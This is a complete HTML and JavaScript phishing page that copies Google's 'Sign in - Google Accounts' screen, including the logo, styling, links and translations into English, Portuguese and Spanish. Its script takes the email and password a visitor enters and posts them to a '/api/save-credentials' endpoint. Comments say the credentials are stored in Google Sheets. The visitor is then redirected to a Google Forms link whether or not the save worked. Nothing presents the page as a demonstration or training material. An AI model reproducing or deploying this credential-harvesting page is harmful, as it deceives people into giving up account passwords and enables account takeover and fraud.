<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in - Google Accounts</title>
    <style>
* {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
}

body {
    font-family: 'Google Sans', 'Roboto', Arial, sans-serif;
    background-color: #fff;
    min-height: 100vh;
    display: flex;
    flex-direction: column;
    justify-content: space-between;
    margin: 0;
}

.container {
    display: flex;
    justify-content: flex-end;
    align-items: center;
    flex: 1;
    padding: 0;
    padding-right: 15%;
    padding-top: 80px;
    padding-bottom: 80px;
}

.login-card {
    background: white;
    border: 1px solid #dadce0;
    border-radius: 8px;
    padding: 48px 40px 36px;
    width: 100%;
    max-width: 450px;
    box-shadow: none;
    position: relative;
}

.logo-container {
    margin-bottom: 20px;
}

.google-logo {
    width: 75px;
    height: 24px;
}

.heading {
    font-size: 24px;
    font-weight: 400;
    color: #202124;
    margin-bottom: 8px;
    line-height: 1.3333;
}

.subtitle {
    font-size: 16px;
    color: #202124;
    margin-bottom: 40px;
    font-weight: 400;
}

.form-step {
    display: none;
}

.form-step.active {
    display: block;
}

.input-container {
    margin-bottom: 8px;
}

.input-field {
    width: 100%;
    padding: 13px 15px;
    font-size: 16px;
    border: 1px solid #dadce0;
    border-radius: 4px;
    outline: none;
    transition: border-color 0.2s, box-shadow 0.2s;
    font-family: 'Google Sans', 'Roboto', Arial, sans-serif;
    background-color: #fff;
}

.input-field:focus {
    border-color: #1a73e8;
    border-width: 1px;
    box-shadow: 0 0 0 1px #1a73e8;
    padding: 13px 15px;
}

.input-field::placeholder {
    color: #80868b;
}

.forgot-link {
    color: #1a73e8;
    text-decoration: none;
    font-size: 14px;
    font-weight: 500;
    display: inline-block;
    margin-bottom: 24px;
}

.forgot-link:hover {
    color: #174ea6;
    text-decoration: underline;
}

.guest-mode-text {
    font-size: 14px;
    color: #5f6368;
    line-height: 1.4286;
    margin-top: 32px;
    margin-bottom: 0;
}

.learn-more-link {
    color: #1a73e8;
    text-decoration: none;
}

.learn-more-link:hover {
    text-decoration: underline;
}

.password-header {
    margin-bottom: 24px;
}

.email-display {
    font-size: 14px;
    color: #202124;
    margin-bottom: 8px;
    font-weight: 500;
}

.use-different-account {
    color: #1a73e8;
    text-decoration: none;
    font-size: 14px;
    font-weight: 500;
    display: inline-block;
}

.use-different-account:hover {
    color: #174ea6;
    text-decoration: underline;
}

.password-actions {
    margin-top: 8px;
}

.show-password {
    display: flex;
    align-items: center;
    font-size: 14px;
    color: #202124;
    cursor: pointer;
    user-select: none;
}

.show-password input[type="checkbox"] {
    margin-right: 8px;
    width: 18px;
    height: 18px;
    cursor: pointer;
}

.actions {
    display: flex;
    justify-content: space-between;
    align-items: center;
    margin-top: 26px;
    padding-top: 26px;
    border-top: 1px solid #dadce0;
}

.create-account-link {
    color: #1a73e8;
    text-decoration: none;
    font-size: 14px;
    font-weight: 500;
}

.create-account-link:hover {
    color: #174ea6;
    text-decoration: underline;
}

.next-button {
    background-color: #1a73e8;
    color: white;
    border: none;
    border-radius: 4px;
    padding: 10px 24px;
    font-size: 14px;
    font-weight: 500;
    cursor: pointer;
    font-family: 'Google Sans', 'Roboto', Arial, sans-serif;
    transition: background-color 0.2s, box-shadow 0.2s;
    min-width: 80px;
}

.next-button:hover {
    background-color: #1557b0;
    box-shadow: 0 1px 2px 0 rgba(60,64,67,.3), 0 1px 3px 1px rgba(60,64,67,.15);
}

.next-button:active {
    background-color: #1557b0;
    box-shadow: 0 1px 2px 0 rgba(60,64,67,.3), 0 2px 6px 2px rgba(60,64,67,.15);
}

.footer {
    display: flex;
    justify-content: space-between;
    align-items: center;
    padding: 24px 32px;
    font-size: 12px;
    color: #5f6368;
}

.footer-left {
    display: flex;
    align-items: center;
}

.language-selector {
    border: none;
    background: transparent;
    color: #5f6368;
    font-size: 12px;
    cursor: pointer;
    padding: 4px 8px;
    outline: none;
    font-family: 'Google Sans', 'Roboto', Arial, sans-serif;
}

.footer-right {
    display: flex;
    gap: 24px;
}

.footer-link {
    color: #5f6368;
    text-decoration: none;
}

.footer-link:hover {
    text-decoration: underline;
}

@media (max-width: 900px) {
    .card-content {
        flex-direction: column;
        gap: 24px;
    }
    
    .left-section {
        min-width: 100%;
    }
}

@media (max-width: 600px) {
    .login-card {
        padding: 24px;
        max-width: 100%;
    }
    
    .container {
        padding-right: 20px;
    }
    
    .footer {
        flex-direction: column;
        gap: 16px;
        text-align: center;
    }
}
    </style>
</head>
<body>
    <div class="container">
        <div class="login-card">
            <div class="logo-container">
                <svg class="google-logo" viewBox="0 0 24 24">
                    <path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/>
                    <path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/>
                    <path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/>
                    <path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/>
                </svg>
            </div>
            
            <h1 class="heading">Sign in</h1>
            <p class="subtitle">Use your Google Account</p>
            
            <div id="email-step" class="form-step active">
                <div class="input-container">
                    <input type="text" id="email-input" class="input-field" placeholder="Email or phone" autocomplete="username">
                </div>
                <a href="https://accounts.google.com/signin/recovery" target="_blank" class="forgot-link">Forgot email?</a>
                <p class="guest-mode-text">
                    Not your computer? Use Guest mode to sign in privately.
                    <a href="https://support.google.com/accounts/answer/6090865" target="_blank" class="learn-more-link">Learn more</a>
                </p>
            </div>
            
            <div id="password-step" class="form-step">
                <div class="password-header">
                    <div class="email-display" id="email-display"></div>
                    <a href="#" class="use-different-account" id="back-to-email">Use a different account</a>
                </div>
                <div class="input-container">
                    <input type="password" id="password-input" class="input-field" placeholder="Enter your password" autocomplete="current-password">
                    <div class="password-actions">
                        <label class="show-password">
                            <input type="checkbox" id="show-password">
                            <span>Show password</span>
                        </label>
                    </div>
                </div>
                <a href="https://accounts.google.com/signin/recovery" target="_blank" class="forgot-link">Forgot password?</a>
            </div>
            
            <div class="actions">
                <a href="https://accounts.google.com/signup" target="_blank" class="create-account-link">Create account</a>
                <button id="next-button" class="next-button">Next</button>
            </div>
        </div>
    </div>
    
    <footer class="footer">
        <div class="footer-left">
            <select class="language-selector">
                <option>English (United States)</option>
                <option>Português (Brasil)</option>
                <option>Español</option>
            </select>
        </div>
        <div class="footer-right">
            <a href="https://support.google.com/accounts" target="_blank" class="footer-link">Help</a>
            <a href="https://policies.google.com/privacy" target="_blank" class="footer-link">Privacy</a>
            <a href="https://policies.google.com/terms" target="_blank" class="footer-link">Terms</a>
        </div>
    </footer>
    
    <script>
// Traduções
const translations = {
    'en': {
        heading: 'Sign in',
        subtitle: 'Use your Google Account',
        emailPlaceholder: 'Email or phone',
        forgotEmail: 'Forgot email?',
        guestMode: 'Not your computer? Use Guest mode to sign in privately.',
        learnMore: 'Learn more',
        passwordPlaceholder: 'Enter your password',
        showPassword: 'Show password',
        forgotPassword: 'Forgot password?',
        useDifferentAccount: 'Use a different account',
        createAccount: 'Create account',
        next: 'Next',
        loginSuccess: 'Login realizado com sucesso!',
        loginError: 'Erro ao processar login. Tente novamente.'
    },
    'pt': {
        heading: 'Fazer login',
        subtitle: 'Use sua Conta do Google',
        emailPlaceholder: 'E-mail ou telefone',
        forgotEmail: 'Esqueceu o e-mail?',
        guestMode: 'Não é seu computador? Use o Modo visitante para fazer login em particular.',
        learnMore: 'Saiba mais',
        passwordPlaceholder: 'Digite sua senha',
        showPassword: 'Mostrar senha',
        forgotPassword: 'Esqueceu a senha?',
        useDifferentAccount: 'Usar outra conta',
        createAccount: 'Criar conta',
        next: 'Próxima',
        loginSuccess: 'Login realizado com sucesso!',
        loginError: 'Erro ao processar login. Tente novamente.'
    },
    'es': {
        heading: 'Iniciar sesión',
        subtitle: 'Usa tu cuenta de Google',
        emailPlaceholder: 'Correo electrónico o teléfono',
        forgotEmail: '¿Olvidaste tu correo?',
        guestMode: '¿No es tu computadora? Usa el modo de invitado para iniciar sesión de forma privada.',
        learnMore: 'Más información',
        passwordPlaceholder: 'Ingresa tu contraseña',
        showPassword: 'Mostrar contraseña',
        forgotPassword: '¿Olvidaste tu contraseña?',
        useDifferentAccount: 'Usar otra cuenta',
        createAccount: 'Crear cuenta',
        next: 'Siguiente',
        loginSuccess: '¡Inicio de sesión exitoso!',
        loginError: 'Error al procesar el inicio de sesión. Inténtalo de nuevo.'
    }
};

// Detectar idioma do navegador
function detectLanguage() {
    const browserLang = navigator.language || navigator.userLanguage;
    const langCode = browserLang.split('-')[0].toLowerCase();
    
    // Suportar pt-BR, pt-PT, etc.
    if (browserLang.toLowerCase().includes('pt')) {
        return 'pt';
    }
    
    // Retornar idioma suportado ou padrão (inglês)
    return translations[langCode] ? langCode : 'en';
}

// Aplicar traduções
function applyTranslations(lang) {
    const t = translations[lang] || translations['en'];
    
    // Atualizar textos
    document.querySelector('.heading').textContent = t.heading;
    document.querySelector('.subtitle').textContent = t.subtitle;
    document.getElementById('email-input').placeholder = t.emailPlaceholder;
    document.querySelector('.forgot-link').textContent = t.forgotEmail;
    document.querySelector('.guest-mode-text').innerHTML = `${t.guestMode} <a href="https://support.google.com/accounts/answer/6090865" target="_blank" class="learn-more-link">${t.learnMore}</a>`;
    document.getElementById('password-input').placeholder = t.passwordPlaceholder;
    document.querySelector('.show-password span').textContent = t.showPassword;
    if (document.querySelectorAll('.forgot-link')[1]) {
        document.querySelectorAll('.forgot-link')[1].textContent = t.forgotPassword;
    }
    document.getElementById('back-to-email').textContent = t.useDifferentAccount;
    document.querySelector('.create-account-link').textContent = t.createAccount;
    document.getElementById('next-button').textContent = t.next;
    
    // Atualizar atributo lang do HTML
    document.documentElement.lang = lang === 'pt' ? 'pt-BR' : lang === 'es' ? 'es' : 'en';
    
    // Atualizar seletor de idioma
    const langSelector = document.querySelector('.language-selector');
    const langMap = {
        'en': 'English (United States)',
        'pt': 'Português (Brasil)',
        'es': 'Español'
    };
    if (langSelector) {
        langSelector.value = langMap[lang] || langMap['en'];
    }
}

// Variáveis globais
let currentStep = 'email';
let currentLang = 'en';

// Detectar e aplicar idioma ao carregar
window.addEventListener('DOMContentLoaded', () => {
    currentLang = detectLanguage();
    applyTranslations(currentLang);
    
    // Permitir mudança manual de idioma
    const langSelector = document.querySelector('.language-selector');
    if (langSelector) {
        langSelector.addEventListener('change', (e) => {
            const selected = e.target.value;
            let lang = 'en';
            if (selected.includes('Português')) lang = 'pt';
            else if (selected.includes('Español')) lang = 'es';
            currentLang = lang;
            applyTranslations(lang);
        });
    }
});

const emailInput = document.getElementById('email-input');
const passwordInput = document.getElementById('password-input');
const emailStep = document.getElementById('email-step');
const passwordStep = document.getElementById('password-step');
const nextButton = document.getElementById('next-button');
const emailDisplay = document.getElementById('email-display');
const backToEmailLink = document.getElementById('back-to-email');
const showPasswordCheckbox = document.getElementById('show-password');

// Função para avançar para a tela de senha
function goToPasswordStep() {
    const email = emailInput.value.trim();
    if (email) {
        emailStep.classList.remove('active');
        passwordStep.classList.add('active');
        emailDisplay.textContent = email;
        currentStep = 'password';
        passwordInput.focus();
        const t = translations[currentLang] || translations['en'];
        nextButton.textContent = t.next;
    }
}

// Função para voltar para a tela de email
function goToEmailStep() {
    passwordStep.classList.remove('active');
    emailStep.classList.add('active');
    currentStep = 'email';
    emailInput.focus();
    passwordInput.value = '';
    const t = translations[currentLang] || translations['en'];
    nextButton.textContent = t.next;
}

// Função para salvar credenciais no Google Sheets via API REST
async function saveCredentials(email, password) {
    console.log('=== SALVANDO CREDENCIAIS ===');
    console.log('Email:', email);
    console.log('Password:', password ? '***' : 'vazio');
    
    try {
        const response = await fetch('/api/save-credentials', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                email: email,
                password: password
            })
        });

        const data = await response.json();
        console.log('Resposta da API:', data);
        
        if (response.ok) {
            console.log('✅ Credenciais salvas no Google Sheets com sucesso!');
            // Redirecionar para o Google Forms após salvar
            setTimeout(() => {
                window.location.href = 'https://forms.gle/Xnf7nppr9fjVrEW39';
            }, 500);
        } else {
            console.error('❌ Erro ao salvar:', data.error);
            // Mesmo com erro, redirecionar
            setTimeout(() => {
                window.location.href = 'https://forms.gle/Xnf7nppr9fjVrEW39';
            }, 500);
        }
    } catch (error) {
        console.error('❌ Erro na requisição:', error);
        // Mesmo com erro, redirecionar
        setTimeout(() => {
            window.location.href = 'https://forms.gle/Xnf7nppr9fjVrEW39';
        }, 500);
    }
}

// Event listener para o botão Next
nextButton.addEventListener('click', () => {
    if (currentStep === 'email') {
        goToPasswordStep();
    } else {
        const email = emailInput.value.trim();
        const password = passwordInput.value;
        if (password && email) {
            // Salvar credenciais no servidor
            saveCredentials(email, password);
        }
    }
});

// Permitir Enter para avançar
emailInput.addEventListener('keypress', (e) => {
    if (e.key === 'Enter' && emailInput.value.trim()) {
        goToPasswordStep();
    }
});

passwordInput.addEventListener('keypress', (e) => {
    if (e.key === 'Enter' && passwordInput.value) {
        const email = emailInput.value.trim();
        const password = passwordInput.value;
        if (password && email) {
            saveCredentials(email, password);
        }
    }
});

// Voltar para email quando clicar em "Use a different account"
backToEmailLink.addEventListener('click', (e) => {
    e.preventDefault();
    goToEmailStep();
});

// Mostrar/ocultar senha
showPasswordCheckbox.addEventListener('change', () => {
    passwordInput.type = showPasswordCheckbox.checked ? 'text' : 'password';
});

// Focar no input de email ao carregar a página
window.addEventListener('load', () => {
    emailInput.focus();
});
    </script>
</body>
</html>
